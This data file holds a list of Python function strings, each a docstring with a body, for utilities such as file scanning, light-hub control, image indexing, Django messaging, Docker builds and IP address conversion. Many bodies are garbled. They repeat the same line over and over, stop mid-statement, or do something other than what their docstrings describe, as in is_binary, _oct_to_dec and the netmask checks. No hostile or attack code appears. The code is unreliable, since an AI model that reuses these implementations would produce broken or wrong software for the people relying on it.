        "def scanProcessForOpenFile(self, searchPortion, isExactMatch=True, ignoreCase=False):\n        '''\n            scanProcessForOpenFile - Scans open FDs for a given pid to see if any are the provided searchPortion\n\n            @param searchPortion <str> - Filename to check\n            @param isExactMatch <bool> Default True - If match should be exact, otherwise a partial match is performed.\n            @param ignoreCase <bool> Default False - If True, search will be performed case-insensitively\n\n        @return -  If result is found, the following dict is returned. If no match found on the given pid, or the pid is not found running, None is returned.\n                {\n                    'searchPortion' : The search portion provided\n                    'pid'           : The passed pid (as an integer)\n                    'owner'         : String of process owner",
        "def scanAllProcessessForOpenFile(self, searchPortion, isExactMatch = True, ignoreCase = False):\n        '''\n        scanAllProcessessForOpenFile - Scans all processes on the system for a given filename\n\n            @param searchPortion <str> - Filename to check\n            @param isExactMatch <bool> Default True - If match should be exact, otherwise a partial match is performed.\n            @param ignoreCase <bool> Default False - If True, search will be performed case-insensitively\n\n        @return - <dict> - A dictionary of pid -> mappingResults for each pid that matched the search pattern. For format of \"mappingResults\", @see scanProcessForOpenFile\n        '''\n        # Get the list of processes\n        processes = self.getProcesses()\n\n        # Get the list of processes for the given filename\n        pidMap = {}\n        for pid in",
        "def _connect_socket(self):\n        \"\"\"Create and connect to socket for TCP communication with hub.\"\"\"\n        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._socket.settimeout(self._socket_timeout)\n        self._socket.connect((self._host, self._port))\n        self._socket.setblocking(False)\n        return self._socket",
        "def _send_tcp(self, command, payload):\n        \"\"\"Send TCP command to hub and return response.\"\"\"\n        try:\n            response = self._hub.send_tcp(command, payload)\n        except Exception as e:\n            self._logger.exception(\"Error sending command to hub: %s\", e)\n            return None\n        return response",
        "def _recv_loop(self, timeout=None):\n        \"\"\"Receive TCP response, looping to get whole thing or timeout.\"\"\"\n        while True:\n            try:\n                data = self._sock.recv(self._recv_size)\n            except socket.timeout:\n                return\n            if not data:\n                break\n            self._sock.send(data)\n            if timeout is not None:\n                time.sleep(timeout)",
        "def get_light_data(self):\n        \"\"\"Get current light data as dictionary with light zids as keys.\"\"\"\n        data = {}\n        for light in self.lights:\n            data[light.zid] = light.data\n        return data",
        "def get_light_data(self):\n        \"\"\"Get current light data, set and return as list of Bulb objects.\"\"\"\n        data = self.get_raw_data()\n        bulbs = []\n        for bulb in data:\n            bulbs.append(Bulb(bulb))\n        return bulbs",
        "def set_brightness(self, brightness):\n        \"\"\"Set brightness of bulb.\"\"\"\n        self._set_brightness(brightness, self._brightness_range)",
        "def set_color(self, color, brightness):\n        \"\"\"Set color and brightness of bulb.\"\"\"\n        self._set_color(color, brightness)\n        self._set_brightness(brightness)",
        "def update_lights(self):\n        \"\"\"Update light objects to their current values.\"\"\"\n        for light in self.lights:\n            light.update()\n            if light.is_on:\n                self.lights[light.name].value = light.value",
        "def add_edgar_form(self, form_path, sec_filings=None):\n        \"\"\"\n        This function takes a file path beginning with edgar and stores the form in a directory.\n        The default directory is sec_filings but can be changed through a keyword argument.\n        \"\"\"\n        if sec_filings is None:\n            sec_filings = self.sec_filings\n        if not os.path.exists(sec_filings):\n            os.makedirs(sec_filings)\n        if not os.path.exists(form_path):\n            os.makedirs(os.path.join(sec_filings, form_path))\n        with open(form_path, 'r') as f:\n            for line in f:\n                line = line.strip()\n                if line.startswith('#'):\n                    continue",
        "def read_file(self, filename):\n        \"\"\"read file as is\"\"\"\n        with open(filename, 'r') as f:\n            return f.read()",
        "def cleanup(self, files):\n    \"\"\"\n    Clean up after ourselves, removing created files.\n    @param {[String]} A list of file paths specifying the files we've created\n        during run. Will all be deleted.\n    @return {None}\n    \"\"\"\n    for path in files:\n      try:\n        os.remove(path)\n      except OSError as e:\n        if e.errno != errno.ENOENT:\n          raise",
        "def create_index_file(root_dir, location, image_files, dirs, force_no_processing):\n    \"\"\"\n    Create an index file in the given location, supplying known lists of\n    present image files and subdirectories.\n    @param {String} root_dir - The root directory of the entire crawl. Used to\n        ascertain whether the given location is the top level.\n    @param {String} location - The current directory of the crawl. The index\n        file will be created here.\n    @param {[String]} image_files - A list of image file names in the location.\n        These will be displayed in the index file's gallery.\n    @param {[String]} dirs - The subdirectories of the location directory.\n        These will be displayed as links further down the file structure.\n    @param {Boolean=False} force_no_processing - If True, do",
        "def crawl_down(root_dir, force_no_processing=False):\n    \"\"\"\n    Crawl the root directory downwards, generating an index HTML file in each\n    directory on the way down.\n    @param {String} root_dir - The top level directory to crawl down from. In\n        normal usage, this will be '.'.\n    @param {Boolean=False} force_no_processing - If True, do not attempt to\n        actually process thumbnails, PIL images or anything. Simply index\n        <img> tags with original file src attributes.\n    @return {[String]} Full file paths of all created files.\n    \"\"\"\n    if not os.path.exists(root_dir):\n        os.makedirs(root_dir)\n    files = []\n    for root, dirs, files in os.walk(root_dir):\n        for f in files:",
        "def get_image(dir_path, image_file):\n    \"\"\"\n    Get an instance of PIL.Image from the given file.\n    @param {String} dir_path - The directory containing the image file\n    @param {String} image_file - The filename of the image file within dir_path\n    @return {PIL.Image} An instance of the image file as a PIL Image, or None\n        if the functionality is not available. This could be because PIL is not\n        present, or because it can't process the given file type.\n    \"\"\"\n    if not PIL:\n        return None\n    try:\n        return PIL.Image.open(os.path.join(dir_path, image_file))\n    except IOError:\n        return None",
        "def get_image_data(img, fallback_image_file):\n    \"\"\"\n    Get base-64 encoded data as a string for the given image. Fallback to return\n    fallback_image_file if cannot get the image data or img is None.\n    @param {Image} img - The PIL Image to get src data for\n    @param {String} fallback_image_file - The filename of the image file,\n        to be used when image data capture fails\n    @return {String} The base-64 encoded image data string, or path to the file\n        itself if not supported.\n    \"\"\"\n    if img is None:\n        return fallback_image_file\n    try:\n        return img.getdata()\n    except AttributeError:\n        return fallback_image_file",
        "def _get_thumbnail_from_file(dir_path, image_file):\n    \"\"\"\n    Get a PIL.Image from the given image file which has been scaled down to\n    THUMBNAIL_WIDTH wide.\n    @param {String} dir_path - The directory containing the image file\n    @param {String} image_file - The filename of the image file within dir_path\n    @return {PIL.Image} An instance of the thumbnail as a PIL Image, or None\n        if the functionality is not available. See _get_image_from_file for\n        details.\n    \"\"\"\n    if not os.path.exists(os.path.join(dir_path, image_file)):\n        return None\n    try:\n        with open(os.path.join(dir_path, image_file)) as f:\n            image = Image.open(",
        "def run():\n    \"\"\"\n    Run the image server. This is blocking. Will handle user KeyboardInterrupt\n    and other exceptions appropriately and return control once the server is\n    stopped.\n    @return {None}\n    \"\"\"\n    try:\n        while True:\n            try:\n                data = yield from socket.recv(1024)\n            except socket.error:\n                if sys.exc_info()[1] == KeyboardInterrupt:\n                    break\n                else:\n                    raise\n            if not data:\n                break\n            yield from server.send(data)\n    finally:\n        server.stop()",
        "def run_from_dir(dir_path):\n    \"\"\"\n    Generate indexes and run server from the given directory downwards.\n    @param {String} dir_path - The directory path (absolute, or relative to CWD)\n    @return {None}\n    \"\"\"\n    logger.info(\"Generating indexes...\")\n    generate_indexes(dir_path)\n    logger.info(\"Running server...\")\n    run_server(dir_path)",
        "def _get_file_contents(self, filename):\n        \"\"\"\n        USE carefully ^^\n        \"\"\"\n        with open(filename, 'r') as f:\n            return f.read()",
        "def random_blending_masks(self, size=None):\n        \"\"\"random blending masks\"\"\"\n        if size is None:\n            size = self.size\n        return np.random.randint(size, size, size)",
        "def z(self):\n        \"\"\"z value as like a seed\"\"\"\n        if self._z is None:\n            self._z = self.random.randint(0, self.z_max)\n        return self._z",
        "def _permutation_to_matrix(matches):\n    \"\"\"Converts a permutation into a permutation matrix.\n\n    `matches` is a dictionary whose keys are vertices and whose values are\n    partners. For each vertex ``u`` and ``v``, entry (``u``, ``v``) in the\n    returned matrix will be a ``1`` if and only if ``matches[u] == v``.\n\n    Pre-condition: `matches` must be a permutation on an initial subset of the\n    natural numbers.\n\n    Returns a permutation matrix as a square NumPy array.\n    \"\"\"\n    # The permutation matrix is a square NumPy array.\n    matrix = np.zeros((len(matches), len(matches)))\n    for i in range(len(matches)):\n        for j in range(len(matches)):\n            if matches[i] == matches[j]:\n",
        "def block_matrix(blocks, top_block_size, bottom_block_size, left_block_size):\n    \"\"\"Convenience function that creates a block matrix with the specified\n    blocks.\n\n    Each argument must be a NumPy matrix. The two top matrices must have the\n    same number of rows, as must the two bottom matrices. The two left matrices\n    must have the same number of columns, as must the two right matrices.\n    \"\"\"\n    assert blocks.shape == (top_block_size, bottom_block_size, left_block_size)\n    assert blocks.shape == (left_block_size, right_block_size)\n    assert blocks.shape == (top_block_size, bottom_block_size)\n    assert blocks.shape == (left_block_size, right_block_size)\n    assert blocks.shape == (top_block_size",
        "def bipartite_adjacency_matrix(A):\n    \"\"\"\n    Returns the adjacency matrix of a bipartite graph whose biadjacency\n    matrix is `A`.\n\n    `A` must be a NumPy array.\n\n    If `A` has **m** rows and **n** columns, then the returned matrix has **m +\n    n** rows and columns.\n    \"\"\"\n    A = np.asarray(A)\n    if A.ndim != 2:\n        raise ValueError('A must be a 2D array')\n    if A.shape[0] != A.shape[1]:\n        raise ValueError('A must be a square matrix')\n    if A.shape[0] != A.shape[1]:\n        raise ValueError('A must be a square matrix')\n    if A.shape[0] != A.shape[2]:\n       ",
        "def nonzero_matrix(D):\n    \"\"\"\n    Returns the Boolean matrix in the same shape as `D` with ones exactly\n    where there are nonzero entries in `D`.\n\n    `D` must be a NumPy array.\n    \"\"\"\n    D = np.asarray(D)\n    return D.nonzero()[0]",
        "def bump_version(version, which=None):\n    \"\"\"Returns the result of incrementing `version`.\n\n    If `which` is not specified, the \"patch\" part of the version number will be\n    incremented.  If `which` is specified, it must be ``'major'``, ``'minor'``,\n    or ``'patch'``. If it is one of these three strings, the corresponding part\n    of the version number will be incremented instead of the patch number.\n\n    Returns a string representing the next version number.\n\n    Example::\n\n        >>> bump_version('2.7.1')\n        '2.7.2'\n        >>> bump_version('2.7.1', 'minor')\n        '2.8.0'\n        >>> bump_version('2.7.1', 'major')\n        '3.0.0'",
        "def get_version(filename):\n    \"\"\"Gets the current version from the specified file.\n\n    This function assumes the file includes a string of the form::\n\n        <pattern> = <version>\n\n    \"\"\"\n    with open(filename, 'r') as f:\n        for line in f:\n            if line.startswith('<pattern>'):\n                return line.split(' = ')[1].strip()\n    return None",
        "def exit(message, status=0):\n    \"\"\"\n    Prints the specified message and exits the program with the specified\n    exit status.\n    \"\"\"\n    print(message)\n    sys.exit(status)",
        "def tag(self):\n        \"\"\"Tags the current version.\"\"\"\n        self.version = self.version.replace('-dev', '')\n        self.version = self.version.replace('-dev-', '')\n        self.version = self.version.replace('-dev-', '')\n        self.version = self.version.replace('-dev-', '')\n        self.version = self.version.replace('-dev-', '')\n        self.version = self.version.replace('-dev-', '')\n        self.version = self.version.replace('-dev-', '')\n        self.version = self.version.replace('-dev-', '')\n        self.version = self.version.replace('-dev-', '')\n        self.version = self.version.replace('-dev-', '')\n        self.version = self.version.replace('-dev-',",
        "def _init_templates(self, templates_path, global_data):\n        \"\"\"\n        initialize with templates' path\n        parameters\n          templates_path    str    the position of templates directory\n          global_data       dict   globa data can be got in any templates\n        \"\"\"\n        self.templates_path = templates_path\n        self.global_data = global_data\n        self.templates = {}\n        for template_path in glob.glob(self.templates_path):\n            template_name = os.path.basename(template_path)\n            template_path = os.path.join(self.templates_path, template_path)\n            self.templates[template_name] = Template(template_path, self.global_data)",
        "def render(self, template, data):\n        \"\"\"\n        Render data with template, return html unicodes.\n        parameters\n          template   str  the template's filename\n          data       dict the data to render\n        \"\"\"\n        template = self.get_template(template)\n        return template.render(data)",
        "def render_template(self, template, data, path):\n        \"\"\"Render data with template and then write to path\"\"\"\n        self.logger.debug(\"Rendering template: %s\", template)\n        return self.render(template, data, path)",
        "def render(template, data=None, **kwargs):\n    \"\"\"\n    shortcut to render data with `template`. Just add exception\n    catch to `renderer.render`\n    \"\"\"\n    try:\n        return renderer.render(template, data, **kwargs)\n    except Exception as e:\n        raise e",
        "def get_dataframe(self):\n        \"\"\"\n        Get the DataFrame for this view.\n        Defaults to using `self.dataframe`.\n\n        This method should always be used rather than accessing `self.dataframe`\n        directly, as `self.dataframe` gets evaluated only once, and those results\n        are cached for all subsequent requests.\n\n        You may want to override this if you need to provide different\n        dataframes depending on the incoming request.\n        \"\"\"\n        if self._dataframe is None:\n            self._dataframe = self.dataframe\n        return self._dataframe",
        "def index(self, request):\n        \"\"\"Indexes the row based on the request parameters.\"\"\"\n        if request.method == 'POST':\n            self.form = self.get_form(request.POST)\n            if self.form.is_valid():\n                self.object = self.form.save()\n                self.object.pk = self.object.id\n                self.object.save()\n                return HttpResponseRedirect(reverse('index'))\n        else:\n            self.form = self.get_form()\n        return self.render_to_response({\n            'form': self.form,\n        })",
        "def get_row(self, request, obj=None):\n        \"\"\"\n        Returns the row the view is displaying.\n\n        You may want to override this if you need to provide non-standard\n        queryset lookups.  Eg if objects are referenced using multiple\n        keyword arguments in the url conf.\n        \"\"\"\n        if obj is None:\n            obj = self.get_object()\n        return self.get_queryset().get(pk=obj.pk)",
        "def paginator(self):\n        \"\"\"The paginator instance associated with the view, or `None`.\"\"\"\n        if self._paginator is None:\n            self._paginator = Paginator(self.get_queryset(), self.get_paginate_by())\n        return self._paginator",
        "def page(self, page_number=1, page_size=None):\n        \"\"\"Return a single page of results, or `None` if pagination is disabled.\"\"\"\n        if not self.enabled:\n            return None\n        if page_number < 1:\n            raise ValueError('page_number must be greater than or equal to 1')\n        if page_size is None:\n            page_size = self.page_size\n        if page_number > self.total_pages:\n            raise ValueError('page_number must be less than total pages')\n        return self.results[page_number * page_size:page_number * page_size + page_size]",
        "def parse_config(config_file):\n    \"\"\"parse config, return a dict\"\"\"\n    config = {}\n    with open(config_file) as f:\n        for line in f:\n            line = line.strip()\n            if line:\n                key, value = line.split(':', 1)\n                config[key] = value\n    return config",
        "def render_to(template, path, renderer=None, **kwargs):\n    \"\"\"\n    shortcut to render data with `template` and then write to `path`.\n    Just add exception catch to `renderer.render_to`\n    \"\"\"\n    try:\n        return renderer.render_to(template, **kwargs)\n    except Exception as e:\n        raise e",
        "def parse_ascii_post(post):\n    \"\"\"Parse ascii post source, return dict\"\"\"\n    post_data = post.split('\\n')\n    post_data = [x.strip() for x in post_data]\n    post_data = [x for x in post_data if x]\n    post_data = [x for x in post_data if x]\n    post_data = [x for x in post_data if x]\n    post_data = [x for x in post_data if x]\n    post_data = [x for x in post_data if x]\n    post_data = [x for x in post_data if x]\n    post_data = [x for x in post_data if x]\n    post_data = [x for x in post_data if x]\n    post_data = [x for x in",
        "def parse_post_source_name(post_source_name):\n    \"\"\"parse post source files name to datetime object\"\"\"\n    post_source_name = post_source_name.strip()\n    if not post_source_name:\n        return None\n    post_source_name = post_source_name.replace('.md', '')\n    post_source_name = post_source_name.replace('.txt', '')\n    post_source_name = post_source_name.replace('.txt.gz', '')\n    post_source_name = post_source_name.replace('.txt.gz.gz', '')\n    post_source_name = post_source_name.replace('.txt.gz.gz.gz', '')\n    post_source_name = post_source_name.replace('.txt.gz.gz.gz.gz', '')\n",
        "def run_server(port, host, host_port, debug=False):\n    \"\"\"run a server binding to port\"\"\"\n    if debug:\n        print(\"running on port %s\" % port)\n    server = Server(host, port)\n    server.start()\n    return server",
        "def get_source_update_time(self):\n        \"\"\"get source files' update time\"\"\"\n        if self.source_update_time is None:\n            self.source_update_time = self.get_source_update_time_from_file()\n        return self.source_update_time",
        "def watch(self):\n        \"\"\"\n        watch files for changes, if changed, rebuild blog. this thread\n        will quit if the main process ends\n        \"\"\"\n        while not self.stop:\n            try:\n                self.update()\n            except Exception as e:\n                self.log.exception(e)\n                self.log.exception(\"stopping watch thread\")\n                self.stop.set()",
        "def deploy(self, name):\n        \"\"\"Deploy new blog to current directory\"\"\"\n        self.log.info(\"Deploying blog %s\", name)\n        self.deploy_dir(name)\n        self.log.info(\"Blog %s deployed\", name)",
        "def update_context(self, alias):\n        \"\"\"Temporarily update the context to use the BlockContext for the given alias.\"\"\"\n        if alias in self.context:\n            self.context[alias] = BlockContext(self.context[alias])\n        else:\n            raise KeyError(\"No BlockContext for alias: %r\" % alias)",
        "def find_matching_block(self, block_id):\n        \"\"\"Find the first matching block in the current block_context\"\"\"\n        for block in self.block_context:\n            if block.id == block_id:\n                return block",
        "def load_widgets(self, widgets):\n        \"\"\"Load a series of widget libraries.\"\"\"\n        for widget in widgets:\n            self.widgets[widget.name] = widget",
        "def get_widget_names(self, field):\n        \"\"\"Return a list of widget names for the provided field.\"\"\"\n        widget_names = []\n        for widget in self.widgets:\n            if widget.field == field:\n                widget_names.append(widget.widget_name)\n        return widget_names",
        "def reuse(parser, token):\n    \"\"\"\n    Allow reuse of a block within a template.\n\n    {% reuse '_myblock' foo=bar %}\n\n    If passed a list of block names, will use the first that matches:\n\n    {% reuse list_of_block_names .... %}\n    \"\"\"\n    bits = token.split_contents()\n    if len(bits) != 2:\n        raise template.TemplateSyntaxError(\"%r takes exactly two arguments\" % bits[0])\n    return ReuseNode(bits[1])",
        "def _force_text(self, value):\n        \"\"\"When dealing with optgroups, ensure that the value is properly force_text'd.\"\"\"\n        if value is None:\n            return None\n        if isinstance(value, six.string_types):\n            return force_text(value)\n        return value",
        "def _deserialize_message(self, message):\n        \"\"\"\n        Message instances are namedtuples of type `Message`.\n        The date field is already serialized in datetime.isoformat ECMA-262 format\n        \"\"\"\n        if isinstance(message, Message):\n            return message\n        elif isinstance(message, (list, tuple)):\n            return [self._deserialize_message(m) for m in message]\n        else:\n            raise TypeError(\"Message must be a Message instance or a list or tuple\")",
        "def send_message(users, level, message_text, extra_tags=None, date=None, url=None,\n                fail_silently=False):\n    \"\"\"\n    Send a message to a list of users without passing through `django.contrib.messages`\n\n    :param users: an iterable containing the recipients of the messages\n    :param level: message level\n    :param message_text: the string containing the message\n    :param extra_tags: like the Django api, a string containing extra tags for the message\n    :param date: a date, different than the default timezone.now\n    :param url: an optional url\n    :param fail_silently: not used at the moment\n    \"\"\"\n    if not users:\n        return\n\n    if not isinstance(users, (list, tuple)):\n        users = [users]\n\n    if not isinstance(level,",
        "def send_message(level, message_text, extra_tags=None, date=None, url=None, fail_silently=False):\n    \"\"\"\n    Send a message to all users aka broadcast.\n\n    :param level: message level\n    :param message_text: the string containing the message\n    :param extra_tags: like the Django api, a string containing extra tags for the message\n    :param date: a date, different than the default timezone.now\n    :param url: an optional url\n    :param fail_silently: not used at the moment\n    \"\"\"\n    if not url:\n        url = settings.DEFAULT_URL\n    if not date:\n        date = timezone.now()\n    if not extra_tags:\n        extra_tags = ''\n    if not level:\n        level = settings.DEFAULT_LEVEL\n    if not message_text:",
        "def mark_as_read(user, message):\n    \"\"\"\n    Mark message instance as read for user.\n    Returns True if the message was `unread` and thus actually marked as `read` or False in case\n    it is already `read` or it does not exist at all.\n\n    :param user: user instance for the recipient\n    :param message: a Message instance to mark as read\n    \"\"\"\n    if message.read:\n        return False\n\n    if message.unread:\n        return True\n\n    if message.sender == user:\n        return True\n\n    return False",
        "def mark_read(user):\n    \"\"\"Mark all message instances for a user as read.\n\n    :param user: user instance for the recipient\n    \"\"\"\n    for m in Message.objects.filter(user=user):\n        m.read = True\n        m.save()",
        "def messages(self):\n        \"\"\"Renders a list of archived messages for the current user\"\"\"\n        messages = self.get_messages()\n        messages = [m.as_dict() for m in messages]\n        return self.render_json(messages)",
        "def get_unread_messages(self, user):\n        \"\"\"\n        Retrieve unread messages for current user, both from the inbox and\n        from other storages\n        \"\"\"\n        unread_messages = []\n        for message in self.get_messages(user):\n            unread_messages.append(message)\n        return unread_messages",
        "def _handle_message(self, message):\n        \"\"\"\n        If the message level was configured for being stored and request.user\n        is not anonymous, save it to the database. Otherwise, let some other\n        class handle the message.\n\n        Notice: controls like checking the message is not empty and the level\n        is above the filter need to be performed here, but it could happen\n        they'll be performed again later if the message does not need to be\n        stored.\n        \"\"\"\n        if not message:\n            return\n\n        if self.message_level is None:\n            return\n\n        if self.message_level > self.message_level_filter:\n            return\n\n        if self.message_level == self.MESSAGE_LEVEL_USER:\n            self.message_level = self.MESSAGE_LEVEL_USER\n            self.message_level_filter = self.MESSAGE",
        "def _update_persistent_messages(self):\n        \"\"\"\n        persistent messages are already in the database inside the 'archive',\n        so we can say they're already \"stored\".\n        Here we put them in the inbox, or remove from the inbox in case the\n        messages were iterated.\n\n        messages contains only new msgs if self.used==True\n        else contains both new and unread messages\n        \"\"\"\n        if self.used:\n            self.inbox.append(self.message)\n            self.used = False\n        else:\n            self.inbox.remove(self.message)\n            self.used = True",
        "def _prepare_messages(self, messages):\n        \"\"\"\n        Like the base class method, prepares a list of messages for storage\n        but avoid to do this for `models.Message` instances.\n        \"\"\"\n        if not messages:\n            return\n        for message in messages:\n            if not isinstance(message, models.Message):\n                raise TypeError(\n                    \"Message must be a Message instance, not %s\" % type(message)\n                )\n            self._prepare_message(message)",
        "def main():\n    \"\"\"Main entry point for script.\"\"\"\n    args = parse_args()\n    if args.debug:\n        logging.basicConfig(level=logging.DEBUG)\n    else:\n        logging.basicConfig(level=logging.INFO)\n\n    if args.verbose:\n        logging.getLogger('requests').setLevel(logging.DEBUG)\n\n    if args.debug:\n        logging.getLogger('requests').setLevel(logging.DEBUG)\n\n    if args.verbose:\n        logging.getLogger('requests').setLevel(logging.INFO)\n\n    if args.verbose:\n        logging.getLogger('requests').setLevel(logging.DEBUG)\n\n    if args.verbose:\n        logging.getLogger('requests').setLevel(logging.INFO)\n\n    if args.verbose:\n        logging.getLogger('requests').setLevel(logging",
        "def init_logger(base_level=logging.INFO, verbose_level=logging.INFO,\n                logging_dict=None):\n    \"\"\"initializes a base logger\n\n    you can use this to init a logger in any of your files.\n    this will use config.py's LOGGER param and logging.dictConfig to configure\n    the logger for you.\n\n    :param int|logging.LEVEL base_level: desired base logging level\n    :param int|logging.LEVEL verbose_level: desired verbose logging level\n    :param dict logging_dict: dictConfig based configuration.\n     used to override the default configuration from config.py\n    :rtype: `python logger`\n    \"\"\"\n    if logging_dict is None:\n        logging_dict = {}\n    logger = logging.getLogger()\n    logger.setLevel(base_level)\n    if verbose_level is not None",
        "def configure(self, factory):\n        \"\"\"Configure an object with a user-supplied factory.\"\"\"\n        self._factory = factory\n        self._factory.configure(self)",
        "def set_verbosity(is_verbose_output):\n    \"\"\"sets the global verbosity level for console and the jocker_lgr logger.\n\n    :param bool is_verbose_output: should be output be verbose\n    \"\"\"\n    global _verbosity\n    if is_verbose_output:\n        _verbosity = 1\n    else:\n        _verbosity = 0",
        "def get_config(config_file):\n    \"\"\"\n    returns a configuration object\n\n    :param string config_file: path to config file\n    \"\"\"\n    config = ConfigParser.SafeConfigParser()\n    config.read(config_file)\n    return config",
        "def build_and_push(varsfile, templatefile, outputfile, configfile, dryrun=False,\n                  build=False, push=False, verbose=False):\n    \"\"\"\n    generates a Dockerfile, builds an image and pushes it to DockerHub\n\n    A `Dockerfile` will be generated by Jinja2 according to the `varsfile`\n    imported. If build is true, an image will be generated from the\n    `outputfile` which is the generated Dockerfile and committed to the\n    image:tag string supplied to `build`.\n    If push is true, a build will be triggered and the produced image\n    will be pushed to DockerHub upon completion.\n\n    :param string varsfile: path to file with variables.\n    :param string templatefile: path to template file to use.\n    :param string outputfile: path to output Dockerfile.\n    :param string",
        "def _parse_status(self, string):\n        \"\"\"\n        since the push process outputs a single unicode string consisting of\n        multiple JSON formatted \"status\" lines, we need to parse it so that it\n        can be read as multiple strings.\n\n        This will receive the string as an input, count curly braces and ignore\n        any newlines. When the curly braces stack is 0, it will append the\n        entire string it has read up until then to a list and so forth.\n\n        :param string: the string to parse\n        :rtype: list of JSON's\n        \"\"\"\n        lines = string.splitlines()\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line",
        "def upload_image(self, image_file, image_type, image_size,\n                      image_url, image_name,\n                      image_format, image_format_options,\n                      image_format_type, image_format_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options_type,\n                      image_format_type_options",
        "def is_ipv4(ip):\n    \"\"\"Return true if the IP address is in dotted decimal notation.\"\"\"\n    try:\n        ip_address = socket.inet_pton(socket.AF_INET, ip)\n    except socket.error:\n        return False\n    return True",
        "def is_binary(ip):\n    \"\"\"Return true if the IP address is in binary notation.\"\"\"\n    try:\n        socket.inet_pton(socket.AF_INET, ip)\n        return True\n    except socket.error:\n        return False",
        "def is_oct(ip):\n    \"\"\"Return true if the IP address is in octal notation.\"\"\"\n    try:\n        ip = int(ip)\n    except ValueError:\n        return False\n    if ip < 0 or ip > 0x7f:\n        return False\n    return True",
        "def is_ipv4(ip):\n    \"\"\"Return true if the IP address is in decimal notation.\"\"\"\n    try:\n        ip = ip.split('.')[0]\n    except IndexError:\n        return False\n    try:\n        ip = int(ip)\n    except ValueError:\n        return False\n    return True",
        "def _netmask_is_notation(netmask, notation):\n    \"\"\"\n    Function internally used to check if the given netmask\n    is of the specified notation.\n    \"\"\"\n    if netmask is None:\n        return False\n    if netmask.startswith('0x'):\n        netmask = netmask[2:]\n    if netmask.endswith('0x'):\n        netmask = netmask[0:-2]\n    if netmask.startswith('0x'):\n        netmask = netmask[2:]\n    if netmask.endswith('0x'):\n        netmask = netmask[0:-2]\n    if netmask.startswith('0x'):\n        netmask = netmask[2:]\n    if netmask.endswith('0x'):\n        netmask = netmask[0:-2]\n    if netmask.startswith('0x'):\n        netmask = netmask[2",
        "def _is_netmask_not_not_at_all(netmask):\n    \"\"\"Return true if the netmask is in bits notatation.\"\"\"\n    if netmask is None:\n        return True\n    if netmask.startswith('0x'):\n        netmask = netmask[2:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('",
        "def _is_wildcard(netmask):\n    \"\"\"Return true if the netmask is in wildcard bits notatation.\"\"\"\n    if netmask is None:\n        return False\n    if netmask.startswith('0x'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[1:]\n    if netmask.startswith('0x0'):\n        netmask",
        "def decimal_to_decimal(value):\n    \"\"\"Dotted decimal notation to decimal conversion.\"\"\"\n    if value is None:\n        return None\n    if value.startswith('.'):\n        return Decimal(value[1:])\n    return Decimal(value)",
        "def decimal_to_dotted_decimal(decimal_value):\n    \"\"\"Decimal to dotted decimal notation conversion.\"\"\"\n    if decimal_value is None:\n        return None\n    if decimal_value == 0:\n        return ''\n    if decimal_value == 1:\n        return '.'\n    if decimal_value == -1:\n        return ''\n    if decimal_value == 0.0:\n        return ''\n    if decimal_value == 1.0:\n        return '.'\n    if decimal_value == -1.0:\n        return ''\n    if decimal_value == 0.001:\n        return ''\n    if decimal_value == 1.0e-9:\n        return ''\n    if decimal_value == 1.0e-10:\n        return '.'\n    if decimal_value == 1.0e-11:\n        return ''\n    if decimal_value",
        "def hex2dec(hexstr):\n    \"\"\"Hexadecimal to decimal conversion.\"\"\"\n    hexstr = hexstr.replace('0x', '')\n    hexstr = hexstr.replace('0b', '')\n    hexstr = hexstr.replace('0o', '')\n    hexstr = hexstr.replace('0x', '')\n    hexstr = hexstr.replace('0o', '')\n    hexstr = hexstr.replace('0x', '')\n    hexstr = hexstr.replace('0o', '')\n    hexstr = hexstr.replace('0x', '')\n    hexstr = hexstr.replace('0o', '')\n    hexstr = hexstr.replace('0x', '')\n    hexstr = hexstr.replace('0o', '')\n    hexstr = hexstr.replace('0o', '')\n    hexstr = hexstr.replace('0o',",
        "def _oct_to_dec(oct):\n    \"\"\"Octal to decimal conversion.\"\"\"\n    if oct < 0:\n        raise ValueError(\"Octal value must be greater than 0\")\n    if oct == 0:\n        return 0\n    if oct == 1:\n        return 1\n    if oct == 2:\n        return 2\n    if oct == 3:\n        return 3\n    if oct == 4:\n        return 4\n    if oct == 5:\n        return 5\n    if oct == 6:\n        return 6\n    if oct == 7:\n        return 7\n    raise ValueError(\"Octal value must be between 0 and 7\")",
        "def _binary_to_decimal(value, precision):\n    \"\"\"Binary to decimal conversion.\"\"\"\n    if precision == 0:\n        return value\n    if precision == 1:\n        return Decimal(value)\n    if precision == 2:\n        return Decimal(value, precision)\n    raise ValueError(\"Invalid precision: %s\" % precision)",
        "def _generate_binary_table(byte_value):\n    \"\"\"\n    Generate a table to convert a whole byte to binary.\n    This code was taken from the Python Cookbook, 2nd edition - O'Reilly.\n    \"\"\"\n    # The table is a 2-byte sequence, with the first byte being the byte\n    # value, and the second byte being the byte value.\n    table = []\n    for i in range(0, len(byte_value), 2):\n        table.append(byte_value[i:i+2])\n    return table",
        "def DecimalToBinary(value, precision=None):\n  \"\"\"Decimal to binary conversion.\"\"\"\n  if precision is None:\n    precision = _DEFAULT_PRECISION\n  if precision < 0:\n    raise ValueError(\"Precision must be greater than 0.\")\n  if precision == 0:\n    return value\n  return Decimal(value).to_binary(precision)",
